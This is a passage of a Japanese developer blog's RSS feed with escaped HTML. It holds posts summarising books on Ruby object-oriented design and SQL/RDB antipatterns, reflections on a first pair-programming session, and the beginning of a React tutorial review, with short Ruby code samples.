&lt;span class="hatena-asin-detail-label">出版社/メーカー:&lt;/span> &lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/%B5%BB%BD%D1%C9%BE%CF%C0%BC%D2">技術評論社&lt;/a>
&lt;/li>
&lt;li>
&lt;span class="hatena-asin-detail-label">発売日:&lt;/span> 2016/09/02&lt;/li>
&lt;li>
&lt;span class="hatena-asin-detail-label">メディア:&lt;/span> 大型本&lt;/li>
&lt;li>&lt;a href="http://d.hatena.ne.jp/asin/477418361X/hatena-blog-22" target="_blank">この商品を含むブログ (6件) を見る&lt;/a>&lt;/li>
&lt;/ul>
&lt;/div>
&lt;div class="hatena-asin-detail-foot">&lt;/div>
&lt;/div>
&lt;p>を読んだ備忘録です。&lt;/p>
&lt;h3>5章　ダックタイピングでコストを削減する&lt;/h3>
&lt;p>ダックタイピングは、たとえオブジェクトのクラスや型が違っても、同じふるまいをするのであれば共&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/%C4%CC%B2%BD">通化&lt;/a>できるということです。&lt;br>
特に特定のクラスであれば〇〇を行って、別のクラスだったら✗✗をするのような感じのcase文を見かけたときには、それぞれに共通のインターフェースをもたせて依存を減らすことができます。&lt;br>
例えばこんな感じのコード&lt;/p>
&lt;pre class="code lang-ruby" data-lang="ruby" data-unlink> class Test
def make(questions)
questions.each { |question|
case question
when SelectiveQuestion
question.make_selective_question
when DescriptiveQuestion
question.make_descriptive_question
end
end
end
end
&lt;/pre>
&lt;p>Student#answerは渡された問題のクラスによって処理を分岐しています。&lt;br>
これは他のクラスへ依存を増やすことになり、更に問題の種類を増やしたらcase文をまた一段追加しなくてはなりません。&lt;br>
ここで登場するのがダックタイピング
questionsにはmake_questionという振る舞いを期待して、make_questionすればダックじゃなくてもダックなのです。&lt;/p>
&lt;pre class="code lang-ruby" data-lang="ruby" data-unlink> class Test
def make(questions)
questions.each do |question|
question.make_question
end
end
end
&lt;/pre>
&lt;p>これで各Questionクラスにmake_questionを実装すれば、いちいちクラスを増やすたびにケース文を追加することもなくなります。振る舞いを抽象化して他のクラスを信頼することが大事。&lt;/p>
&lt;h2>6章　継承によって振る舞いを獲得する&lt;/h2>
&lt;p>本書では継承と&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/%A5%B3%A5%F3%A5%DD%A5%B8%A5%B7%A5%E7%A5%F3">コンポジション&lt;/a>という2つのコード構成のテクニックが紹介されています。&lt;br>
1つ目がこの章の主題の継承で、クラスの継承は依存を強くしてしまうリスクはあるけど、親クラスの小さな変更で全てを変えたり、サブクラスの追加が簡単に行えたりとメリットも大きいです。&lt;/p>
&lt;p>この章で一番大事なことは、「親クラスは小クラスにとっても当てはまることのみ持っているべき」という継承の契約でしょう。 &lt;br>
この契約を守る方法として、一度それぞれ具体的にクラスを作って、全てに共通する抽象的な部分だけ集めて親クラスにしようというものが書かれていました。&lt;br>
親クラスは抽象的であるべき、の典型的な例はStandardErrorとかでしょうか。エラーという概念のみ表していますよね。&lt;br>
また、この章ではもう一つ継承による構造での依存を下げる具体的な案として、superを減らすということも書かれています。&lt;br>
フックを親クラスに持たせるテクニックはまさにそれで、制御を抽象的な親クラスにうつしてクラス同士の結合を減らす作業が紹介されていました。&lt;/p>
&lt;h2>第七章 モジュールでロールの振る舞いを継承する&lt;/h2>
&lt;p>引き続き継承を扱っている章です。6章の内容がより具体的に書かれているのと、モジュールのミックスインにたいしても、メソッド探索の中に追加されるものだから継承と基本的に同じ考え方で行おうねと書いてあります。&lt;/p>
&lt;h2>第八章　&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/%A5%B3%A5%F3%A5%DD%A5%B8%A5%B7%A5%E7%A5%F3">コンポジション&lt;/a>でオブジェクトを組み合わせる。&lt;/h2>
&lt;p>継承とは別のコードの構成として&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/%A5%B3%A5%F3%A5%DD%A5%B8%A5%B7%A5%E7%A5%F3">コンポジション&lt;/a>について書かれています。&lt;br>
継承はいわゆる階層構造(is_a?)でしたが、&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/%A5%B3%A5%F3%A5%DD%A5%B8%A5%B7%A5%E7%A5%F3">コンポジション&lt;/a>ではhas-aの関係、例えば本書では自転車はPartsをもち、PartsはPartをもっている...という考え方でコードを構成します。&lt;/p>
&lt;pre class="code lang-ruby" data-lang="ruby" data-unlink> #オブジェクト指向設計実践ガイド　～Rubyでわかる 進化しつづける柔軟なアプリケーションの育て方 225pより
class Bicycle
attr_reader :size, :parts
def initialize(args = {})
@size = args[:size]
@parts = args[:parts]
end
def spares
parts.spares
end
end
require 'forwardable'
class Parts
extend Forwardable
attr_reader :parts
def_delegators :@parts, :size, :each
def initialize(parts)
@parts = parts
end
def spares
parts.select(&amp;amp;:needs_spare)
end
end
require 'ostruct'
class Part
attr_reader :name, :description, :needs_spare
def initialize(args = {})
@name = args[:name]
@description = args[:description]
@needs_spare = args.fetch(needs_spare, true)
end
end
require 'ostruct'
module PartsFactory
def self.build(
config,
parts_class = Parts
)
parts_class.new(
config.collect do |part_config|
create_part(part_config)
end
)
end
def self.create_part(part_config)
OpenStruct.new(
name: part_config[0],
description: part_config[1],
needs_spare: part_config.fetch(2, true)
)
end
end
&lt;/pre>
&lt;p>なかなかコードがないと伝えづらいのでコードを引用させていただきました。(&lt;s>ForwardableとかOpenstruact初めて知りました…&lt;/s>）&lt;br>
個々のわかりやすい動作をするオブジェクトを集めて最終的に複雑なオブジェクトを作り出すという構造です。&lt;br>
&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/%A5%B3%A5%F3%A5%DD%A5%B8%A5%B7%A5%E7%A5%F3">コンポジション&lt;/a>は継承に比べてそれぞれのオブジェクトの関係を明示しないと関係をもってくれませんが、よりオブジェクト同士の依存を少なくする事ができます。&lt;br>
しかし、それがデメリットでもあり、自転車、Parts、Partそれぞれの構造はわかりやすいですが、全体像はわかりにくく、委譲を明示しなくてはならないので、継承のように少ない記述でコードの共有をサポートしてくれたりはしません。&lt;br>
継承と&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/%A5%B3%A5%F3%A5%DD%A5%B8%A5%B7%A5%E7%A5%F3">コンポジション&lt;/a>、どちらを選択すべきか？という問いに対しては、&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/%A5%B3%A5%F3%A5%DD%A5%B8%A5%B7%A5%E7%A5%F3">コンポジション&lt;/a>でできそうだったら&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/%A5%B3%A5%F3%A5%DD%A5%B8%A5%B7%A5%E7%A5%F3">コンポジション&lt;/a>のほうが依存を少なくできるので有効な場合が多い、と書かれていて、パーツがおおければ&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/%A5%B3%A5%F3%A5%DD%A5%B8%A5%B7%A5%E7%A5%F3">コンポジション&lt;/a>のほうが、パーツそれぞれを深く掘り下げて、抽象的な共通部分を見つける継承が適していると判断できれば継承を利用すると良い可能性が高いとのことです。&lt;/p>
&lt;h2>第9章　費用対効果の高いテストを設計する&lt;/h2>
&lt;p>テストの大切さや入力と出力の部分だけ考えるべき、といった部分はよくある意見と特に変わらないのですが、よりコードの構造に沿ったテストを無駄なく書こうとする具体的な方法が書かれていました。&lt;br>
継承されたコードをテストする時は、抽象的な親クラスのテストはインクルードして全てパスするようにする、というびはこの本で初めて認識した考えかでした。&lt;/p>
&lt;h2>まとめ&lt;/h2>
&lt;p>全章を通して、オブジェクトの責任を明確にすること、オブジェクト同士の依存は少なくすること、依存してもより変更がないものにすること。関係をつくるインターフェースを注意して設計することの大切さが説かれていました。&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/%A5%C7%A5%B6%A5%A4%A5%F3%A5%D1%A5%BF%A1%BC%A5%F3">デザインパターン&lt;/a>の話がすこし出てきて、しっかり理解できてないこともあるので今度は&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/ruby">ruby&lt;/a>による&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/%A5%C7%A5%B6%A5%A4%A5%F3%A5%D1%A5%BF%A1%BC%A5%F3">デザインパターン&lt;/a>とかいいかな？と考えております。&lt;/p>
&lt;/body></description></item><item><title>「失敗から学ぶRDBの正しい歩き方」を読んで</title><link>https://qwyng.dev/posts/2019/03/18/231417/</link><pubDate>Mon, 18 Mar 2019 23:14:00 +0900</pubDate><guid>https://qwyng.dev/posts/2019/03/18/231417/</guid><description>&lt;body>
&lt;p>&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/Twitter">Twitter&lt;/a>でおすすめされていたので
&lt;/p>
&lt;div class="hatena-asin-detail">
&lt;a href="http://www.amazon.co.jp/exec/obidos/ASIN/4297104083/hatena-blog-22/">&lt;img src="https://images-fe.ssl-images-amazon.com/images/I/51B4ihagImL._SL160_.jpg" class="hatena-asin-detail-image" alt="失敗から学ぶRDBの正しい歩き方 (Software Design plus)" title="失敗から学ぶRDBの正しい歩き方 (Software Design plus)">&lt;/a>&lt;div class="hatena-asin-detail-info">
&lt;p class="hatena-asin-detail-title">&lt;a href="http://www.amazon.co.jp/exec/obidos/ASIN/4297104083/hatena-blog-22/">失敗から学ぶRDBの正しい歩き方 (Software Design plus)&lt;/a>&lt;/p>
&lt;ul>
&lt;li>
&lt;span class="hatena-asin-detail-label">作者:&lt;/span> 曽根壮大&lt;/li>
&lt;li>
&lt;span class="hatena-asin-detail-label">出版社/メーカー:&lt;/span> &lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/%B5%BB%BD%D1%C9%BE%CF%C0%BC%D2">技術評論社&lt;/a>
&lt;/li>
&lt;li>
&lt;span class="hatena-asin-detail-label">発売日:&lt;/span> 2019/03/06&lt;/li>
&lt;li>
&lt;span class="hatena-asin-detail-label">メディア:&lt;/span> 単行本（ソフトカバー）&lt;/li>
&lt;li>&lt;a href="http://d.hatena.ne.jp/asin/4297104083/hatena-blog-22" target="_blank">この商品を含むブログを見る&lt;/a>&lt;/li>
&lt;/ul>
&lt;/div>
&lt;div class="hatena-asin-detail-foot">&lt;/div>
&lt;/div>
を読みました。わかりやすくていい本でした。発売されたばかりの本ですし感想メインで書きたいと思います。
&lt;h2>何がわかりやすいか&lt;/h2>
&lt;p>図もサンプルクエリも豊富でわかりやすいことに加えて、一つ一つの&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/%A5%A2%A5%F3%A5%C1%A5%D1%A5%BF%A1%BC%A5%F3">アンチパターン&lt;/a>の小話形式？の話が、日本で実際にありそうなことなのがイメージの助けになりました。職業エンジニア二ヶ月目で実際に&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/%A5%A2%A5%F3%A5%C1%A5%D1%A5%BF%A1%BC%A5%F3">アンチパターン&lt;/a>みたいなのを体験したことがまだないのが悲しいところですが。（&lt;s>気づいてないだけでもうしているかも&lt;/s>）&lt;/p>
&lt;h3>　噛み砕いた説明&lt;/h3>
&lt;p>噛み砕いて書いてある本だとも感じました。&lt;br>
例えば、INDEXがそもそも有効に利用されるのか？、実行するテーブルの規模を意識してクエリを組み立てているか？という視点から丁寧な解説が書いてありましたし、強すぎる制約を判断する基準なんかは、長くエンジニアとして働いてきたゆえの知見を端的に書いていただいてるなと感じました。&lt;br>
条件に列を使わない、カーナビリティの高低での&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/RDBMS">RDBMS&lt;/a>の処理の違い、エグゼキューターの評価順序なんかは取り入れやすい知見だと思うので、なんとかアウトプットをだしたいです。&lt;/p>
&lt;h2>
&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/RDB">RDB&lt;/a>に対しての無知&lt;/h2>
&lt;p>「テーブルに状態をもたせる」なんかも知らないとデメリットを理解せずやってしまいそうですし、&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/%A5%C8%A5%E9%A5%F3%A5%B6%A5%AF%A5%B7%A5%E7%A5%F3">トランザクション&lt;/a>の分離等にいたっては初耳です。
まだまだ&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/RDB">RDB&lt;/a>、&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/RDBMS">RDBMS&lt;/a>に対して無知であるなぁと強く思いました。
データベースから情報をとってきたり、データベースに情報をいれたり、というのはサーバーサイドであれば言語や&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/%A5%D5%A5%EC%A1%BC%A5%E0%A5%EF%A1%BC%A5%AF">フレームワーク&lt;/a>が変わろうとも（恐らく）ずっとやり続けることだと思うので、転ばぬ先の杖をもっとたくさん持ちたいです。&lt;/p>
&lt;/body></description></item><item><title>オブジェクト指向設計実践ガイド　四章まで読んで気になったこと</title><link>https://qwyng.dev/posts/2019/03/11/230932/</link><pubDate>Mon, 11 Mar 2019 23:09:00 +0900</pubDate><guid>https://qwyng.dev/posts/2019/03/11/230932/</guid><description>&lt;body>
&lt;p>序盤の章は具体的に自分のコードにしてみました。&lt;/p>
&lt;h3>メソッドの責任の分割&lt;/h3>
&lt;p>メソッドの責任を分割してみました。
&lt;span itemscope itemtype="http://schema.org/Photograph">&lt;img src="https://cdn-ak.f.st-hatena.com/images/fotolife/s/sasa5740/20190311/20190311222900.png" alt="f:id:sasa5740:20190311222900p:plain" title="f:id:sasa5740:20190311222900p:plain" class="hatena-fotolife" itemprop="image">&lt;/span>&lt;/p>
&lt;h3>自分より変更されないものに依存しなさい&lt;/h3>
&lt;p>&lt;span itemscope itemtype="http://schema.org/Photograph">&lt;img src="https://cdn-ak.f.st-hatena.com/images/fotolife/s/sasa5740/20190311/20190311222917.png" alt="f:id:sasa5740:20190311222917p:plain" title="f:id:sasa5740:20190311222917p:plain" class="hatena-fotolife" itemprop="image">&lt;/span>
引数の依存を避けるためにキーワード引数を導入してみました。
これで別の場所で&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/%A5%A4%A5%F3%A5%B9%A5%BF%A5%F3%A5%B9">インスタンス&lt;/a>を作る際にクラスがどの順番で処理しているかを考える必要がなくなります。&lt;br>
もちろん世の中これが&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/%A5%C7%A5%D5%A5%A1%A5%AF%A5%C8">デファクト&lt;/a>ではなくていくつかの順番に依存する引数と残りをオプションハッシュにしているメソッドが多いですね。&lt;/p>
&lt;h3>オブジェクトは相手を信頼して隣人にしか声をかけない&lt;/h3>
&lt;p>&lt;code>Player&lt;/code> が&lt;code>Hardware&lt;/code>を使って&lt;code>Software&lt;/code>をプレイしようとしてもPlayerはSoftwareに直接メッセージを送るのは避けるべきで、PlayerはHardwareを信用して、遊びたい中身はSoftwareだとしてもPlayerにはplayというパブリック&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/%A5%A4%A5%F3%A5%BF%A1%BC%A5%D5%A5%A7%A5%A4%A5%B9">インターフェイス&lt;/a>をもたせて詳細な実装は隠すべき
こうするとplayするゲームが&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/VR">VR&lt;/a>になってplay以外のことをHardwareとSoftwareを使ってするようになっても、player.experience等一般化して対応できるようになる。&lt;/p>
&lt;p>&lt;span itemscope itemtype="http://schema.org/Photograph">&lt;img src="https://cdn-ak.f.st-hatena.com/images/fotolife/s/sasa5740/20190311/20190311224812.png" alt="f:id:sasa5740:20190311224812p:plain" title="f:id:sasa5740:20190311224812p:plain" class="hatena-fotolife" itemprop="image">&lt;/span>&lt;/p>
&lt;pre class="code lang-ruby" data-lang="ruby" data-unlink> player.hardware.software.run #ではなく
player.play #とするべき
&lt;/pre>
&lt;h3>　&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/%A5%AA%A5%D6%A5%B8%A5%A7%A5%AF%A5%C8%BB%D8%B8%FE">オブジェクト指向&lt;/a>とは&lt;/h3>
&lt;p>&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/%A5%AA%A5%D6%A5%B8%A5%A7%A5%AF%A5%C8%BB%D8%B8%FE">オブジェクト指向&lt;/a>ってなんだ（困惑）。&lt;br>
単一責任とか&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/%C1%C2%B7%EB%B9%E7">疎結合&lt;/a>とかパブリック&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/%A5%A4%A5%F3%A5%BF%A1%BC%A5%D5%A5%A7%A5%A4%A5%B9">インターフェイス&lt;/a>とか他のオブジェクトを信頼はしても依存はしないのが良いということはわかりました。人間関係かな。&lt;br>
&lt;b>&lt;a href="https://stackedit.io/app#">StackEdit&lt;/a>で簡単にシーケンス図がかけるので最高
&lt;/b>&lt;/p>
&lt;/body></description></item><item><title>はじめてのペアプログラミングをしたので感想とか</title><link>https://qwyng.dev/posts/2019/03/07/225608/</link><pubDate>Thu, 07 Mar 2019 22:56:00 +0900</pubDate><guid>https://qwyng.dev/posts/2019/03/07/225608/</guid><description>&lt;body>
&lt;h3>はじめての&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/%A5%DA%A5%A2%A5%D7%A5%ED%A5%B0%A5%E9%A5%DF%A5%F3%A5%B0">ペアプログラミング&lt;/a>
&lt;/h3>
&lt;p>会社で&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/%A5%DA%A5%A2%A5%D7%A5%ED%A5%B0%A5%E9%A5%DF%A5%F3%A5%B0">ペアプログラミング&lt;/a>をやる機会がありました。&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/%A5%DA%A5%A2%A5%D7%A5%ED%A5%B0%A5%E9%A5%DF%A5%F3%A5%B0">ペアプログラミング&lt;/a>という経験は初めてだったのですがとてもいい経験だったので所感と反省を書きます。&lt;br>
今回ペアの方はベテランで、自分はエンジニア歴一ヶ月のペーペーなので教育的要素があった&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/%A5%DA%A5%A2%A5%D7%A5%ED">ペアプロ&lt;/a>でもあった前提で読んでいただければと思います。&lt;/p>
&lt;h3>やってみて感じたメリット&lt;/h3>
&lt;ul>
&lt;li>
&lt;p>&lt;b>明らかにコードの質が高まる。&lt;/b>&lt;/p>
&lt;ul>
&lt;li>ベテランの方一緒に作業したので当然ですが自分一人で書くよりコードの質がよくなり、考慮した要素が多いものになりました。単純に手戻りが少なくなりそうです。&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>
&lt;p>&lt;b>他の人のコーディングを逐一質問しながら進められる。&lt;/b>&lt;/p>
&lt;ul>
&lt;li>新人側の視点でのメリットですね。オブザーバーとしてどういう考えでこのコードを書いているのかその場で聞けるので設計とかの仕組みが頭に入ってきやすかったです。&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>
&lt;p>&lt;b>二人でやるので開発の手順をしっかり踏むことになる。&lt;/b>&lt;/p>
&lt;ul>
&lt;li>やる前はあんまり考えていなかったのですが、これが一番大きいなと思ったメリットです。自分だけで開発を進めるわけではないので
なんとなくでコードを書いたりすることなく、現状の仕組みを把握し、問題を理解して、解決策を具体的にタスクとして実行するというステップを決めて開発することになります。お互いの足並みが揃わないのにいい開発ができるわけがありませんからね。自分たちが今何をやっているのか、方向性がわかりやすく開発効率が明らかに良かったです。&lt;/li>
&lt;/ul>
&lt;/li>
&lt;/ul>
&lt;h3>
&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/%A5%DA%A5%A2%A5%D7%A5%ED">ペアプロ&lt;/a>と合わせてやってみて良かったこと。&lt;/h3>
&lt;ul>
&lt;li>
&lt;p>&lt;b>&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/%A5%C6%A5%B9%A5%C8%B6%EE%C6%B0%B3%AB%C8%AF">テスト駆動開発&lt;/a>&lt;/b>&lt;/p>
&lt;ul>
&lt;li>今回はモデルをいじる開発で、テストから先に書く開発を行いました。テストを先に書くので開発途中にテストが落として修正するというサイクルが発生し、二人で話し合って分析する対象が明確になります。二人で一つの画面をみて開発する&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/%A5%DA%A5%A2%A5%D7%A5%ED%A5%B0%A5%E9%A5%DF%A5%F3%A5%B0">ペアプログラミング&lt;/a>では相性が良いと感じました。&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>
&lt;p>&lt;b>自分のやろうとしてる事と考えをどんどん声にする。&lt;/b>&lt;/p>
&lt;ul>
&lt;li>新人側がベテランの人にはない視点でスマートな助言を出す、みたいなことはまずないので、自分が&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/%A5%DA%A5%A2%A5%D7%A5%ED%A5%B0%A5%E9%A5%DF%A5%F3%A5%B0">ペアプログラミング&lt;/a>によってチームに寄与できるものは、自分がどう思ってこのコードを書いているかをできるだけオープンにして、次の開発にも確実に持ち帰れる経験値を得ることだと思います。&lt;br>
そのために「これがこうなって〜〜」みたいなのは基本的にどんどん発言してみました。「そうだね」とか「そこはそういう意味のコードにはなっていないよ」とか何かしらフィードバック頂ける種になるので&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/%A5%DA%A5%A2%A5%D7%A5%ED">ペアプロ&lt;/a>で得られるものの効率は上げることができたと思います。&lt;/li>
&lt;/ul>
&lt;/li>
&lt;/ul>
&lt;h3>反省点&lt;/h3>
&lt;ul>
&lt;li>
&lt;p>&lt;b>二人で進めるものという認識が甘かった。&lt;/b>&lt;/p>
&lt;ul>
&lt;li>
&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/%A5%DA%A5%A2%A5%D7%A5%ED%A5%B0%A5%E9%A5%DF%A5%F3%A5%B0">ペアプログラミング&lt;/a>をスタートした時に、僕がすぐさまコードを書こうとしたらペアの方に「最初に手順について確認しましょう」という助言がありました。二人で一つのコードを書くのだから現状の問題、仕組みに関する共通認識と、解決策と具体的な実行手順をお互い把握することがまず最初にあるべきなのは当たり前です。&lt;br>
自分は最初は自分がコードを書いて、それに間違いがあれば指摘してもらうのが新人とベテランの&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/%A5%DA%A5%A2%A5%D7%A5%ED%A5%B0%A5%E9%A5%DF%A5%F3%A5%B0">ペアプログラミング&lt;/a>だろうという認識があったことが招いた行動だと思います。もちろん教育の要素は多分にあるとは思いますが、二人で一つの問題に対して解決策を見つけ、実行する、というのが前提にあるのが&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/%A5%DA%A5%A2%A5%D7%A5%ED%A5%B0%A5%E9%A5%DF%A5%F3%A5%B0">ペアプログラミング&lt;/a>です。&lt;br>
次回機会があればまず二人でこの問題を解決するにはどうしたら良いか、の認識、共有を一番に考えて&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/%A5%DA%A5%A2%A5%D7%A5%ED%A5%B0%A5%E9%A5%DF%A5%F3%A5%B0">ペアプログラミング&lt;/a>を始めるとよりスムーズに行くんじゃないかと思いました。&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>
&lt;p>&lt;b>いつ始めるか明確に定義してなかった。&lt;/b>&lt;/p>
&lt;ul>
&lt;li>これは細かい点なんですが始める時にこれからやる？ok?と声をかけて頂いて始めた（もちろん前日に明日&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/%A5%DA%A5%A2%A5%D7%A5%ED">ペアプロ&lt;/a>やってみるみたいな話はありました）のであいまいな感じでスタートしたのはあんまり良くなかったかもしれないです。&lt;br>
やっぱり二人でやるものですからきっちりこれから始めるという区切りがあるとより良いと感じました。&lt;/li>
&lt;/ul>
&lt;/li>
&lt;/ul>
&lt;h3>まとめ&lt;/h3>
&lt;p>&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/%A5%DA%A5%A2%A5%D7%A5%ED%A5%B0%A5%E9%A5%DF%A5%F3%A5%B0">ペアプログラミング&lt;/a>って普段の開発と違って喋りながらやるので単純に疲れます。ですが思考が整理されていくのを感じますし、やっぱり二人で一つの物を作ったというのは達成感も違います。新人側なのでメリットばかり享受している気もしますが、次もやりたいと思える経験でした。ペアをくんでくださった方には感謝しかないです。&lt;/p>
&lt;/body></description></item><item><title>SQLアンチパターン　第六章を読んで</title><link>https://qwyng.dev/posts/2019/02/25/223712/</link><pubDate>Mon, 25 Feb 2019 22:37:00 +0900</pubDate><guid>https://qwyng.dev/posts/2019/02/25/223712/</guid><description>&lt;body>
&lt;p>&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/SQL">SQL&lt;/a>&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/%A5%A2%A5%F3%A5%C1%A5%D1%A5%BF%A1%BC%A5%F3">アンチパターン&lt;/a>&lt;iframe src="https://hatenablog-parts.com/embed?url=https%3A%2F%2Fwww.oreilly.co.jp%2Fbooks%2F9784873115894%2F" title="SQLアンチパターン" class="embed-card embed-webcard" scrolling="no" frameborder="0" style="display: block; width: 100%; height: 155px; max-width: 500px; margin: 10px 0px;">&lt;/iframe>&lt;cite class="hatena-citation">&lt;a href="https://www.oreilly.co.jp/books/9784873115894/">www.oreilly.co.jp&lt;/a>&lt;/cite>&lt;/p>
&lt;p>を読んでの要約、感想です。&lt;/p>
&lt;h3>目的&lt;/h3>
&lt;p>複数の親を持つテーブルが欲しい。例えばキャ&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/%A5%E9%A5%AF">ラク&lt;/a>ターに関するコメントもアイテムに関するコメントもおなじコメントテーブルに置きたいとうのが今回の目的です。&lt;/p>
&lt;h3>&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/%A5%A2%A5%F3%A5%C1%A5%D1%A5%BF%A1%BC%A5%F3">アンチパターン&lt;/a>&lt;/h3>
&lt;p>&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/%A5%DD%A5%EA%A5%E2%A1%BC%A5%D5%A5%A3%A5%C3%A5%AF">ポリモーフィック&lt;/a>関連を定義するというのが&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/%A5%A2%A5%F3%A5%C1%A5%D1%A5%BF%A1%BC%A5%F3">アンチパターン&lt;/a>。
&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/%A5%DD%A5%EA%A5%E2%A1%BC%A5%D5%A5%A3%A5%C3%A5%AF">ポリモーフィック&lt;/a>関連とは親のテーブルの名前をカラムとして追加してその後外部キー制約なしに外部キーに当たるものをカラムに格納する関連付けの方法です。&lt;/p>
&lt;table>
&lt;thead>
&lt;tr>
&lt;th> comment_id &lt;/th>
&lt;th> target_type &lt;/th>
&lt;th> target_type_id &lt;/th>
&lt;/tr>
&lt;/thead>
&lt;tbody>
&lt;tr>
&lt;td> 1 &lt;/td>
&lt;td> Characters &lt;/td>
&lt;td> 1 &lt;/td>
&lt;/tr>
&lt;tr>
&lt;td> 2 &lt;/td>
&lt;td> Items &lt;/td>
&lt;td> 1 &lt;/td>
&lt;/tr>
&lt;/tbody>
&lt;/table>
&lt;h3>デメリット&lt;/h3>
&lt;ol>
&lt;li>target_typeに他のテーブルの値のみが入ること、target_type_idに他のテーブルの主キーが入ることを保証できない&lt;/li>
&lt;li>Characters、Itemsと結合しようとしても全ての行が一つのテーブルと関係があるわけではないので内部結合はできない&lt;/li>
&lt;/ol>
&lt;h3>使用してもいい場合&lt;/h3>
&lt;p>外部キー制約使えってあります。&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/%A5%D5%A5%EC%A1%BC%A5%E0%A5%EF%A1%BC%A5%AF">フレームワーク&lt;/a>がしっかりしてるならまぁ使っても良いんじゃない？って感じです。使用してもいい場合の文章割と身も蓋もないです。&lt;/p>
&lt;h3>解決策&lt;/h3>
&lt;p>参照を逆にします。今回の例で言えばCommentsテーブルをCharactersとItemsの親にして関係テーブルを仲介させることでtarget_typeカラムを使わずに関係を表すことができます。
共通の親テーブルを作成することも有効です。今回ならGuidesテーブルを作成してguide_idを主キーとしてそれぞれのテーブルにもたせればそれぞれのテーブルが比較可能なカラムをもつので結合が簡単になります。&lt;/p>
&lt;h3>感想&lt;/h3>
&lt;p>毎日書くペースだとまとめ過ぎな気もしてきた（後大変）なのでさっくりまとめる感じでいきたい。どうせならもっと短くしたいという気持ちが強まってきました。この章は解決策がしっかりしていて&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/%A5%DD%A5%EA%A5%E2%A1%BC%A5%D5%A5%A3%A5%C3%A5%AF">ポリモーフィック&lt;/a>関連を使わないのも十分可能だなと感じました。ただ&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/SQL">SQL&lt;/a>の正義が絶対正義ではないみたいな話を職場できいたのでメリデメしっかり理解するのが大事ですね。多分この本全てに言えますけど。&lt;/p>
&lt;/body></description></item><item><title>React チュートリアルをやってみた感想とか</title><link>https://qwyng.dev/posts/2019/02/25/001721/</link><pubDate>Mon, 25 Feb 2019 00:17:00 +0900</pubDate><guid>https://qwyng.dev/posts/2019/02/25/001721/</guid><description>&lt;body>
&lt;h3>はじめに&lt;/h3>
&lt;p>ぎょーむでReactをつかうらしいので&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/%A5%C1%A5%E5%A1%BC%A5%C8%A5%EA%A5%A2%A5%EB">チュートリアル&lt;/a>やってみました&lt;/p>
&lt;p>&lt;iframe src="https://hatenablog-parts.com/embed?url=https%3A%2F%2Freactjs.org%2Ftutorial%2Ftutorial.html" title="Tutorial: Intro to React – React" class="embed-card embed-webcard" scrolling="no" frameborder="0" style="display: block; width: 100%; height: 155px; max-width: 500px; margin: 10px 0px;">&lt;/iframe>&lt;cite class="hatena-citation">&lt;a href="https://reactjs.org/tutorial/tutorial.html">reactjs.org&lt;/a>&lt;/cite>&lt;/p>
&lt;p>すごい良くできていて、途中のコードも全てサンプル載せていて、ローカルの準備までかいてあり、アロー関数宣言とかもコラムにまとめてあったり、なんでこの処理をするのかとか、処理がどんな順番で実行されているのかとか丁寧に書いてあり、JSがそもそもそんなにわからんおじさんでもなんとかなる感じに作ってありました。&lt;br>
